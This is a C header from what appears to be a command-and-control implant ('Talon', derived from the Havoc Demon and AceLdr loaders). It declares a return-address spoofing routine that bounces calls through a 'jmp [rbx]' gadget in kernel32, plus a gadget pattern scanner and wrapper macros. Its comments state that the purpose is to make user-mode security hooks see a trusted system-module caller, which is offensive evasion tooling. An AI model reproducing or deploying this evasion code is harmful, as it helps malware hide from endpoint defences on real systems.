#ifndef AGENT_SPOOF_H
#define AGENT_SPOOF_H

#include <Talon.h>

typedef struct _PRM {
    PVOID Trampoline; /* `jmp [rbx]` gadget (FF 23) inside a trusted module */
    PVOID Function;   /* target function to call */
    PVOID Rbx;        /* caller's rbx, restored on the way back */
} PRM, *PPRM;

/* Probe kernel32 for a usable `jmp [rbx]` gadget (call once at startup). */
VOID SpoofInit( VOID );
BOOL SpoofReady( VOID );

/* Call Function with its return address replaced by the kernel32 gadget, so
 * user-mode hooks that validate the caller see a system-module return
 * address. Returns NULL if no gadget is available (caller must fall back to
 * a direct call). a..h are the target's arguments 1-8. */
PVOID SpoofRetAddr( PVOID Function,
                    PVOID a, PVOID b, PVOID c, PVOID d,
                    PVOID e, PVOID f, PVOID g, PVOID h );

/* linear pattern scan over a module's memory (ported from Demon Memory.c) */
PVOID MmGadgetFind( PVOID Memory, SIZE_T Length, PVOID PatternBuffer, SIZE_T PatternLength );

/* arg-count chooser, extended from Demon/AceLdr */
#define SPOOF_X( fn )                  SpoofRetAddr( fn, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_A( fn, a )               SpoofRetAddr( fn, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_B( fn, a, b )            SpoofRetAddr( fn, a, b, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_C( fn, a, b, c )         SpoofRetAddr( fn, a, b, c, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_D( fn, a, b, c, d )      SpoofRetAddr( fn, a, b, c, d, NULL, NULL, NULL, NULL )
#define SPOOF_E( fn, a, b, c, d, e )   SpoofRetAddr( fn, a, b, c, d, e, NULL, NULL, NULL )
#define SPOOF_F( fn, a, b, c, d, e, f ) SpoofRetAddr( fn, a, b, c, d, e, f, NULL, NULL )
#define SPOOF_G( fn, a, b, c, d, e, f, g ) SpoofRetAddr( fn, a, b, c, d, e, f, g, NULL )

#endif
